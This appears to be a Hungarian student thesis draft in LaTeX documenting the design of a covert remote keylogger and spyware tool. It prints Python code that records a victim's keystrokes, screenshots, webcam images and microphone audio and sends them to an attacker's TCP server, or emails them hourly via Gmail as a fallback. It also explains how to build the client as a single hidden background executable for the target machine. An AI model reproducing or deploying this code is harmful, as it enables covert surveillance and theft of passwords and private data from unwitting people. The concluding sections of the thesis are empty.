A \textbf{pyaudio} és a \textbf{wave} modulok a hangfelvétel készítésében használandók. A \textbf{pyaudio} egy listát állít elő a hanganyaggal, ahogyan azt ábrázolni lehet binárisan, míg a \textbf{wave} ebből a lisából egy $.wav$ kiterjesztésű állományt készít. Ehez szükséges, hogy a felhasználónak legyen mikrofonja, ami csatlakoztatva van a számítógéphez.

A hálózati kapcsolat megteremtéséhez a \textbf{socket} modul segít. Ez meghatározza a kapcsolat milyenségét, hogy hányan csatlakozhatnak a szerverhez és hogy a szerver meddig várjon a kliensre.

Az \textbf{opencv} modul képek vagy videók feldolgozásában használható, például webkamerakép készítésére.

A \textbf{getpass}, \textbf{os}, \textbf{sys}, \textbf{shutil} és \textbf{platform} modulok a rendszerfüggvények elérését biztosítja. A rendszerinformációit függvények használata, mint például a processzor specifikációi, a bejelentkezett felhasználo felhasználóneve, a számítógép neve, a rendszer verziószáma stb.

A \textbf{threading} modul segítségével új, párhuzamos szálakat hoszhatunk létre. Ez segít több feladat elvégzésében egymást nem blokkolva.

A \textbf{datetime} modullal le lehet kérni az aktuális időt, olyan formátumban amilyenben a használó szeretné. %https://www.programiz.com/python-programming/datetime/strftime

Az \textbf{smtplib}, \textbf{imaplib} és \textbf{email} modulok segítsígével lehet kapcsolódni a gmail szerveréhez üzenet küldés vagy fogadás céljából. Az \textbf{imaplib} modullal lehet kapcsolatot teremteni olvasásra, míg az \textbf{smtplib} modullal írásra, azaz küldésre. Az \textbf{email} modul tartalmazza azokat az osztályokat, amelyek szükségesek egy email objektum létrehozásában és kódolásában.

A \textbf{tkinter} modul a GUI elkészítésére használandó, ez felel a megjelenítésben.

A \textbf{logging} modul segítségével visszajelzéseket adunk a szoftvertől a felhasználónak, hogy lehessen követni az aktuális feladat menetét. Ehez szükséges egy $logging.conf$ állomány, maely béállítja a loggolási opciókat.

A \textbf{pyinstaller} modul egy fordító program, amely python kódból futtatható fájlt készít. Lefordításra csak a kliens kerül, mert azt kell az áldozat rendszerére telepíteni, úgy, hogy a háttérben fusson. Ezt be lehet állítani a $w$ opcióval windows és OS X rendszereken, míg *NIX rendszereken nem veszi számításba ezt az opciót. A $onefile$ opció összesűríti egy futtathatóvá, ez által lehetővé teszi, hogy ne kelljen más szükséges állományokat is telepíteni az áldozat rendszerére. Be lehet állítani a futtatható fájl nevét ($name$ opció) és ikonját is ($icon$ opció).

%Teljesítmény...

%Karbantarthatóság...

\section{A részletes tervezés}\label{sec:plan}
\subsection{Szerver}\label{subsec:server}
Előszőr, hogy működjön a gyakori operációs rendszereken (Windows, Linux, MacOS) meg kell nézni, hogy melyiken futtatjuk. Ezt a platform modul system függvény segítségével tudjuk megnézni:

\lstinputlisting[language=Python, firstline=13, lastline=21]{../src/TCP_Server.py}

\noindent Ha nem a három operációs rendszer közé tartozik, akkor kilép a program. Itt a rendszer neve meghatározza a $temp\_path$ változót, ami a későbbiekben arra lesz használva, hogy bizonyos adatokat elmentsen. A $temp\_path$ változó a temporális mappa elérhetőségét tartalmazza. Ez linux és darwin (MacOS) rendszereken megegyező, míg windows rendszeren különbözik.

Ahogyan a Figure \ref{fig:classdia}-en látható, a szerver oldalon három osztály talalható (Server, Keylogger, MenuHandler) és ehez még hozzácsatolódik a GUI rész is.

\subsubsection{Server osztály}\label{subsubsec:serverclass}
A Server osztály hallgat egy bizonyos portot, és várja a kliens kapcsolódását. Az osztálynak három attribútumja van: egy ip cím, port és maga a szerver, amely megmondja, hogy milyen kapcsolatot hoz létre, ebben az esetben TCP kapcsolat. Az ip címnek egy üres karakterláncot kell megadni példányosításkor. A kapcsolat létesítésében a $connect$ függvény játszik szerepet.
%activity vagy szekvencia diagram

\subsubsection{Keylogger osztály}\label{subsubsec:keyloggerclass}
A keylogger osztályt a $Thread$ osztályból van származtatva, mert egy külön szálon kell, hogy fusson a GUI miatt. A GUI csak a fő szálon van engedélyezve. Ennek az osztálynak öt attribútumja van: a létrejött kapcsolat a szerver és a kliens között, a GUI, gmail cím, a hozzá tartozó jelszó és a gmail server api címe. A $connection$ és a $gui$ paraméterek egy-egy osztályt várnak, ezért kapcsolatot és a GUI-t ellenőrizni kell, hogy jó osztály került-e átadásra.
%activity vagy szekvencia diagram

\justify{A $Keylogger$, a fő osztály, amelyre épül a program, kezeli a billentyűzet gombjai lenyomását. Amíg a TCP kapcsolat él, addig azon keresztül küldi a lenyomott karaktereket, amit elment a log.csv állományba a szerver oldalon, hogy a későbbiekben újra megtekinthető legyen. A log.csv állomány formátuma lenyomott billentyű ideje, karakter. Ahol az idő ``nap/hónap/év $|$ óra:perc:másodperc'' formátumu. Fentakadhat egy olyan probléma. hogy a kapcsolat valami oknál fogva megszakad, ekkor e-mail-en keresztül küldi át az adatokat. Erre kell a Figure \ref{fig:sysname}-ön látható $temp\_path$ változó, hogy a lenyomott billentyűket eltudja menteni a kliens számítógépén és azt e-mail-en keresztül elküldje. Erre szolgál a \pageref{subsubsec:keyloggerclass}. oldalon a 4.1.2 alatt megemlített gmail cím és a hozzá kapcsolódó jelszó.}

Itt megkellett tervezni egy protokollt, ami a kommunikáció alapja. A protokoll a következő képpen néz ki:
\begin{table}[H]
\centering
\label{tab:protocol}
\caption{protokoll}
\begin{tabular}{|c|c|c|}
\hline
\textbf{type} & \textbf{time} & \textbf{information} \\
\hline
5 & 11 & ? \\
\hline
\end{tabular}
\end{table}
A $type$ mező megmondja, hogy milyen típusu adat fog jönni az $information$ mezőben. Ez 4 vagy 5 bájt lehet. Előfodulható lehetőségek:
\begin{itemize}
\item chars - egy karakter
\item image - egy képernyőkép bájtsorozata
\item wcpic - egy webkamera kép bájtsorozata
\item audio - egy audio állomány bájtsorozata
\end{itemize}
A $time$ mezőben egy időbéjeg található, amely megmondja, hogy a csomag mikor érkezett. Ez 11 bájt lehet. Formátuma: ``nap\_óra\_perc\_másodperc''.\\
Az $information$ mezőben vannak azok az adatok amelyeket a szerver fel kell dolgozzon. Ezt a ennek a mezőnek nem lehet pontos méretet adni, mert nem tudjuk előre megmondani, hogy mekkora adatot küld, kivétel a karakter. A python nyelvben nincsenek korlátok ebből a szempontból.

A továbbiakban az adatok feldolgozásra kerülnek, ha a TCP kapcsolat még nem zárult be. Az adatok beíródnak egy-egy állományba. Ha az $infomation$ mezőben az ``Error'' szöveg érkezik, akkor sikertelen volt az adatküldés, és a program egy üzenetet ír ki a vezérlőablakra, hogy tudassa a sikertelen folyamatot. A $data$ változó tartalmazza a protokoll által található információt.
\begin{lstlisting}[language=Python]
if data[0] == "image":
	if data[2] == 'Error':
		logger.info("Error with taking screenshot!")
	else:
		with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
			handler.write(data[2])
		logger.info('Done')
elif data[0] == "char":
	write_file(os.path.join(path, filename), data[1:])
	if gui_running:
		self.gui.insert_data(data[1:])
elif data[0] == "wcpic":
	if data[2] == 'Error':
		logger.info("Error with taking webcam picture!")
	else:
		with open(f'./webcam_{data[1]}.png', 'wb') as handler:
			handler.write(data[2])
		logger.info('Done')
elif data[0] == 'audio':
	if data[2] == 'Error':
		logger.info("Error with recording audio!")
	else:
		with open(f'./audio_{data[1]}.wav', 'wb') as handler:
			handler.write(data[2])
		logger.info('Done')
elif data[0] == 'close':
	self.connection.client.close()
	logger.info("Connection closed!\n")
	break
\end{lstlisting}

Ha a TCP kapcsolat felbomlik, akkor e-mail-en keresztül lesz továbbítva az adat csatolmányban. Ahoz, hogy írni és olvasni is tudjunk e-mail-t python kódból, a google fióknál be kell legyen kapcsolva a ``Less secure app access''. A gmail fióknál pedig a következőt kell engedélyezni: Settings $\rightarrow$ See all settings $\rightarrow$ Forwarding and POP/IMAP $\rightarrow$ IMAP access $\rightarrow$ Enable IMAP.

Előszőr csatlakozni kell a megadott gmail címhez. Ez után megnézzük, hogy jött-e olyan e-mail, amit még nem láttunk, ha igen, akkor ellenőrizzük, hogy a saját gmail címünkről jott-e. Ha minden feltétel teljesül, akkor megnyitjuk az e-mail-t és letöltjük a csatolmányokat. Itt két csatolmány érkezik: egy képernyőkép és egy log állomány, amelyben a lenyomott billentyűk vannak naplózva. Ezt a folyamatot ismételjük addig, amíg nincsen hiba. Hiba alatt a következőket lehet érteni: nem engedi a csatlakozást a gmail api szerver, nem tudja megnyitni az elküldött csatolmányokat.

A $get\_attachments$ függvény segítségével tölti le a csatolmányokat, amelynek egy paramétere van: az üzenet. Az üzenet tartalmazza a teljes üzenetet bájtokban, tehát, hogy kiől jött az üzenet, kinek küldték, a téma, maga az üzenet törzse, a csatolmányok. A függvény ezen az üzeneten megy végig és ha talal csatolmányt azt letölti, más szóval megnyit egy állományt binárisan és beleírja a tartalmát.
\begin{lstlisting}[language=Python]
def get_attachments(self, msg):
	for part in msg.walk():
	if part.get_content_maintype() == 'multipart':
		continue
	if part.get('Content-Disposition') is None:
		continue

	filename = part.get_filename()
	if bool(filename):
		with open(os.path.join(temp_path, filename), "wb") as handler:
			handler.write(part.get_payload(decode=True))
\end{lstlisting}

\subsubsection{MenuHandler osztály}\label{subsubsec:menuhandler}
A harmadik osztály a $MenuHandler$, amely segítségével más feladatot is adhatunk a kliensnek a billentyűzet naplózása mellett. Ez az osztály is a $Thread$ osztályból származik, mert egy külön szál kell amiatt, hogy ne blokkolódjon az adatfeldolgozás. Ennek az osztálynak egy attribútumja van: a kapcsolat. Ez a kapcsolat fogja megvalósítani az opciók küldését a kliensnek. Itt négy opció lehet:
\begin{itemize}
\item 1) Take screenshot - képernyőkép
\item 2) Webcam picture - webkamerakép
\item 3) Record audio - audio felvétel
\item 4) Exit - bezárja a TCP kapcsolatot
\end{itemize}
Természetesen le van kezelve, ha nem 1-től 4-ig adunk meg számokat, akkor egy üzenetet ír ki: ``Wrong option!'', vagy ha csak lenyomjuk az ENTER karaktert, akkor egyszerűen új sórba ugrik.

\subsection{Kliens}\label{subsec:client}
%atfogalmazni
A kliensnél nagyjából ugyan az a felállítás, mint a szerver oldalon. Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a ``Client'' osztály, amelynek négy attribútumja van: ip cím, port, a kliens és a gép ip címje. Példányosításkor a szerver ip címét kell megadni. A kliens attribútum megmondja, hogy milyen kapcsolatot hozunk létre, ebben az esetben TCP, mert a szerver is TCP.

\subsubsection{Client osztály}\label{subsubsec:clinetclass}

A kapcsolat létesítésében a $connect$ függvény játszik szerepet. A $socket$ modul $gethostname$ függvényét alkalmazva megkapjuk a gép ip címjét, amely csak egy lokális ip cím. A darwin rendszereknél hozzá kell fűzni a ``.local'' karakterláncot, másképp egy exception lép fel.

%szekvencia diagram

\subsubsection{KeyLoggerClient osztály}\label{subsubsec:keyloggerclientclass}
Ez az osztály valósítsa meg a lenyomott billentyűk kezelését. Hat attribútumot tartalmazó osztály: a kapcsolat, gmail cím, gmail jelszó, gmail api, gmail port és a lenyomott billentyűt tartalmazó változó.

Az első adat nem követi a megállapított protokolt. Ez az adat tartalmazza a kliens rendszerének információit:
\begin{itemize}
\item system name
\item device name
\item release
\item version
\item architecture
\item cpu info
\item user name
\item ip address
\end{itemize}
Ezek után el lesz indítva egy halgató, amely lehalgatja a számítógéphez csatlakoztatott billentyűzetet, amely akkor írja felül a $keys$ attribútumot, amikor a felhaszáló elengedi a billentyűt.
\begin{lstlisting}{language=Python}
keyboard_listener = Listener(on_release=self.on_release)
keyboard_listener.start()
\end{lstlisting}
Az attribútum felülírásáról az $on\_release$ függveny gondoskodik.
\begin{lstlisting}{language=Python}
def on_release(self, key):
	self.keys = key
\end{lstlisting}

A billentyűzet lehalgató után felépítődik az adat, amit a kapcsolaton keresztül elküld. Minden adatépítés után a $keys$ változó a $None$ értéket veszi fel. Adatépítésre és küldésre csak akkor kerül sor, ha a $keys$ változó nem $None$.
\begin{lstlisting}{language=Python}
if self.keys is not None:
	date_time = get_time()
	key = str(self.keys).replace("'", "")
	data = ["chars", date_time, key]
	self.keys = None
	data = str(data)
\end{lstlisting}
A $get\_time$ függvény visszatéríti az adott időt ``nap/hónap/év $|$ óra:perc:másodperc'' formátumban.
\begin{lstlisting}{language=Python}
'''
Gets current time

@return: time in dd/mm/yyyy | HH:MM:SS format
'''
def get_time():
	date_time = datetime.now().strftime("%d/%m/%Y | %H:%M:%S")
	return date_time
\end{lstlisting}
A $keys$ változóba karakterként vagy karakterláncként kerül a lenyomott billentyű, ezért le kell cseélni a szélső idézőjeleket üres karakterekre. Karakter helyett akkor kerül karakterlánc, ha olyan karaktereket nyomunk le, amelyek nem nyomtathatóak, például: $ENTER$, $SPACE$, stb. Ilyenkor $Key.enter$ vagy $Key.space$ stb formátumban kapjuk meg.

Ha a kapcsolat felbomlott, akkor e-mail-en keresztül küldi tovább az adatokat óránként. Itt lépnek érvénybe a gmail cím, a jelszó, a gmail api, és a gmail port. Az adat felépítése ugyan úgy zajlik, mint a TCP kapcsolat alatt. Ebben az esetben a lenyomott billentyűket összegyűjti egy állományba és azt csatolja később az e-mail-hez a képernyőképpel együtt. Egy e-mail felépítése python 3-ban:
\begin{lstlisting}{language=Python}
msg = MIMEMultipart()
msg['From'] = self.email_address
msg['To'] = self.email_address
msg['Subject'] = 'Keylogger result'
body = date_time
msg.attach(MIMEText(body, 'plain'))
file_attachment = MIMEBase('application', 'octet-stream')

with open(os.path.join(temp_path, filename), 'rb') as handler:
file_attachment.set_payload(handler.read())

encoders.encode_base64(file_attachment)
file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
msg.attach(file_attachment)

if take_screenshot(temp_path):
	image_attachment = MIMEBase('application', 'octet-stream')

	with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
		image_attachment.set_payload(handler.read())

	encoders.encode_base64(image_attachment)
	image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
	msg.attach(image_attachment)

content = msg.as_string()
\end{lstlisting}
Miután felépítettük az e-mail-t, kell csatlakozni a gmail szerverhez és elküldeni azt. Ha az e-mail sikeresen el lett küldve, akkor az az állomány, amelybe a lenyomott billentyűket mentettük, törlésre kerül, hogy ne küldjük el ugyan azt mégegyszer. A $content$ változó tartalmazza a teljes e-mail-t a csatolmányokkal együtt.
\begin{lstlisting}{language=Python}
with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
	smtp_server.starttls()
	smtp_server.login(self.email_address, self.email_password)
	smtp_server.sendmail(self.email_address, self.email_address, content)

if os.path.isfile(os.path.join(temp_path, filename)):
	os.remove(os.path.join(temp_path, filename))
if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
	os.remove(os.path.join(temp_path, "screenshot.png"))
\end{lstlisting}

\subsubsection{MenuHandlerClient osztály}\label{subsubsec:menuhandlerclinet}
A $MenuHandlerClient$ osztály foglalkozik az opciók fogadásával, és az opciók által elvégzett feladatokkal. Ez az osztály egy külön szálon kell, hogy fusson, máskülönben blokkolná a fő szálat, ahol a billentyűzetet hallgató osztály fut, lasd \pageref{subsubsec:keyloggerclientclass}. oldal 4.2.2, ezért a $Thread$ osztályból származtatjuk.
A szervertől kapott opciók döntik el, hogy milyen adatot épít fel, és küld el a program:
\begin{itemize}
\item 1 - képernyőkép
\item 2 - webkamerakép
\item 3 - hangrögzítés
\item 4 - felbontja a kapcsolatot
\end{itemize}
\begin{lstlisting}{language=Python}
date_time = datetime.now().strftime("%d_%H_%M_%S")
if option == '1':
	data = ["image", date_time]

	if take_screenshot(temp_path):
		if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
			with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")

	try:
		self.connection.client.sendall(str(data).encode())
	except:
		break
elif option == '2':
	data = ["wcpic", date_time]

	if take_webcam_picture(temp_path):
		if os.path.isfile(os.path.join(temp_path, "wc_picture.png")):
			with open(os.path.join(temp_path, "wc_picture.png"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")

	try:
		self.connection.client.sendall(str(data).encode())
	except:
		break
elif option == '3':
	data = ["audio", date_time]

	if record_audio(temp_path):
		if os.path.isfile(os.path.join(temp_path, "rec_audio.wav")):
			with open(os.path.join(temp_path, "rec_audio.wav"), 'rb') as handler:
				data.append(handler.read())
		else:
			data.append("Error")
	else:
		data.append("Error")

	try:
		self.connection.client.sendall(str(data).encode())
	except:
		break
elif option == '4' or stop_threads:
	data = ["close", date_time, "Exit"]
	self.connection.client.sendall(str(data).encode())
	self.connection.client.close()
	break
\end{lstlisting}

A $take\_screenshot$ függvény fogja megcsinálni a képernyőképet, amely igazat térít vissza, ha sikerült lementenie a képet a $save\_path$ változó tartalmazta helyre. Ugyan ezek érvényesek a $take\_webcam\_picture$ és a $record\_audio$ függvényekre is.
\begin{lstlisting}{language=Python}
def take_screenshot(save_path):
	try:
		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
	except:
		return False
	return True

	
def take_webcam_picture(save_path):
	video_capture = cv2.VideoCapture(0)
	if video_capture.isOpened():
		rval, frame = video_capture.read()
		cv2.imwrite(os.path.join(save_path, "wc_picture.png"), frame)
		return True
	return False


def record_audio(save_path):
	chunk = 1024
	sample_format = pyaudio.paInt16 # 16 bits per sample
	channels = 2
	fs = 44100 # Record at 44100 samples per second
	seconds = 10

	pa = pyaudio.PyAudio()

	try:
		stream = pa.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
		frames = []

		for i in range(0, int(fs / chunk * seconds)):
			data = stream.read(chunk)
			frames.append(data)

		stream.stop_stream()
		stream.close()
		pa.terminate()

		wf = wave.open(os.path.join(save_path, "rec_audio.wav"), 'wb')
		wf.setnchannels(channels)
		wf.setsampwidth(pa.get_sample_size(sample_format))
		wf.setframerate(fs)
		wf.writeframes(b''.join(frames))
		wf.close()
	except:
		return False
	return True
\end{lstlisting}
A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán ($2 = 0$ és $1$) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, ami említésre kerül a komponensek bemotatásánál.

\subsection{GUI}\label{subsec:gui}
A GUI akkor lép működésbe, amikor a kliens csatlakozott a szerverhez, és addig funkcionál, amíg be nem zárják. Van egy $Date\ \&\ Time$ és egy $Characters$ mezője. Az első oszlop tartalmazza az idő béjeget, hogy mikor volt egy bizonyos karakter megnyomva. A második oszlop a lenyomott karaktereket taartalmazza kezdésben. Három gomb találhato az ablak tetején: $PC\ Information$, $Characters$ és $Words$.
\begin{figure}[H]
\centering
\includegraphics[width=400pt, height=435pt]{../images/GUI\ final}
\caption{GUI}
\label{fig:gui}
\end{figure}
Ha a $PC\ Information$ gomb kerül megnyomásra, akkor felugrik egy másik ablak, amely tartalmazza a felhasználó (target) redszerinformációit, lásd \pageref{subsubsec:keyloggerclientclass} oldal. A $Characters$ és a $Words$ gombok a megjelenítésért felelnek. Ahogyan a nevük is mondja, a $Characters$ gomb csak a karaktereket mutatja, míg a $Words$ gomb felépíti a szavakat, és azokat jeleníti meg. Egy szó végét a $SPACE$ vagy az $ENTER$ karakterek jelentik.

\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/character\ transfer\ diagram}
\caption{Karakterek elküldése}
\label{fig:chartransferdia}
\end{figure}

\section{A rendszer felhasználása \ (szoftverek és hardverek esetében)}\label{sec:useage}

\section{Üzembe helyezés és kísérleti eredmények (szoftverek és hardverek esetében)}\label{sec:testcases}

\section{Következtetések}\label{sec:conc}

\section{Irodalomjegyzék}\label{sec:irod}
%\bibliographystyle{IEEEtran}
\printbibliography[title={\ }]

\section{Függelék (beleértve a forráskódot és dokumentációt tartalmazó adathordozót)}\label{sec:dep}

\end{document}